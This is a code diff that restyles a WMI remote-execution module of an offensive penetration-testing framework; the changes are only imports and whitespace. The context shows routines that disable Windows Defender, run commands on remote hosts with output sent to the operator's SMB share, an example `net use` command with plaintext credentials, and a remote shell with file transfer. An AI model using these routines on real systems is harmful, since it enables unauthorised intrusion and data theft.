@@ -23,19 +23,20 @@
 #
 # Customized by @awsmhacks for CMX
 
-
-import ntpath, logging
-import sys
-import os
 import cmd
-
-from gevent import sleep
-from cmx.helpers.misc import gen_random_string
-
-from cmx import config as cfg
+import logging
+import ntpath
+import os
+import sys
 import time
 
 import impacket
+
+from gevent import sleep
+
+from cmx import config as cfg
+from cmx.helpers.misc import gen_random_string
+
 
 OUTPUT_FILENAME = '__output'
 BATCH_FILENAME  = 'execute.bat'
@@ -74,7 +75,7 @@ class WMIEXEC:
             self.__password = ''
 
         dialect = smbconnection.getDialect()
-        
+
         if dialect == impacket.smb.SMB_DIALECT:
             logging.debug("SMBv1 dialect used")
         elif dialect == impacket.smb3structs.SMB2_DIALECT_002:
@@ -111,7 +112,8 @@ class WMIEXEC:
             self.__smbconnection.setTimeout(100000)
 
         #self.disable_notifications()
-        if self.__killDefender: self.disable_defender()
+        if self.__killDefender:
+            self.disable_defender()
 
         self.execute_handler(command)
 
@@ -157,19 +159,18 @@ class WMIEXEC:
         self.__win32Process.Create(command, self.__pwd, None)
         self.get_output_remote()
 
-
     def execute_fileless(self, data):
         self.__output = gen_random_string(6)
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
 
 
-        command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
+        command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip,
                                                                          self.__share_name,
                                                                          self.__output)
         #commandData = data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
         #                                                      self.__share_name,
         #                                                      self.__output)
-        
+
         #adding creds gets past systems disallowing guest-auth
         # cmd.exe /Q /c "net use \\10.10.33.200\CAJKY /savecred /p:no /user:agrande User!23 & cmd.exe /Q /c whoami 1> \\10.10.33.200\CAJKY\QYkvxb 2>&1
         #command = self.__shell + '"net use * /d /y & '
@@ -178,10 +179,9 @@ class WMIEXEC:
         #                                                                                         self.__username, 
         #                                                                                         self.__password, 
         #                                                                                         commandData)
-
         #command = self.__shell + 'net use * /d /y'
-        #command += self.__shell + 'net use \\\\{}\\{} & {} "'.format(local_ip, 
-        #                                            self.__share_name,  
+        #command += self.__shell + 'net use \\\\{}\\{} & {} "'.format(local_ip,
+        #                                            self.__share_name,
         #                                            commandData)
 
         logging.debug('wmi Executing_fileless command: {}'.format(command))
@@ -246,23 +246,23 @@ class WMIEXEC:
         time.sleep(8)
 
 
-####################################################################################################
-####################################################################################################
+###################################################################################################
+###################################################################################################
 #                           Shell Stuff
-####################################################################################################
-####################################################################################################
+###################################################################################################
+###################################################################################################
 
 
     def run(self, addr, dummy):
-        
+        """ starts interactive shell """
         self.shell = None
         logging.debug('inside wmishell.run')
-        
+
         try:
             self.shell = RemoteShell(self.__share, self.__win32Process, self.__smbconnection)
             self.shell.cmdloop()
 
-        except  (Exception, KeyboardInterrupt) as e:
+        except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
@@ -278,7 +278,7 @@ class WMIEXEC:
                 self.__smbconnection.logoff()
             dcom.disconnect()
 
-        except  (Exception, KeyboardInterrupt) as e:
+        except (Exception, KeyboardInterrupt) as e:
             logging.debug('Error: {}'.format(e))
 
 
@@ -317,7 +317,7 @@ class RemoteShell(cmd.Cmd):
  put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
  get {file}                 - downloads pathname to the current local dir 
  ! {cmd}                    - executes a local shell cmd
-""") 
+""")
 
     def do_lcd(self, s):
         if s == '':
@@ -333,7 +333,7 @@ class RemoteShell(cmd.Cmd):
         try:
             import ntpath
             newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
-            drive, tail = ntpath.splitdrive(newPath) 
+            drive, tail = ntpath.splitdrive(newPath)
             filename = ntpath.basename(tail)
             fh = open(filename,'wb')
             logging.info("Downloading %s\\%s" % (drive, tail))
@@ -360,12 +360,12 @@ class RemoteShell(cmd.Cmd):
 
             src_file = os.path.basename(src_path)
             fh = open(src_path, 'rb')
-            dst_path = dst_path.replace('/','\\')
+            dst_path = dst_path.replace('/', '\\')
             import ntpath
-            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
+            pathname = ntpath.join(ntpath.join(self.__pwd, dst_path), src_file)
             drive, tail = ntpath.splitdrive(pathname)
             logging.info("Uploading %s to %s" % (src_file, pathname))
-            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
+            self.__transferClient.putFile(drive[:-1] + '$', tail, fh.read)
             fh.close()
         except Exception as e:
             logging.critical(str(e))
@@ -414,7 +414,7 @@ class RemoteShell(cmd.Cmd):
 
     def get_output(self):
         logging.debug('inside wmi.RemoteShell.get_output')
-        
+
         def output_callback(data):
             try:
                 self.__outputBuffer += data.decode(CODEC)
@@ -448,7 +448,7 @@ class RemoteShell(cmd.Cmd):
         logging.debug('inside wmi.RemoteShell.execute_remote')
         command = self.__shell + data 
         if self.__noOutput is False:
-            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
+            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output + ' 2>&1'
 
         self.__win32Process.Create(command, self.__pwd, None)
         self.get_output()
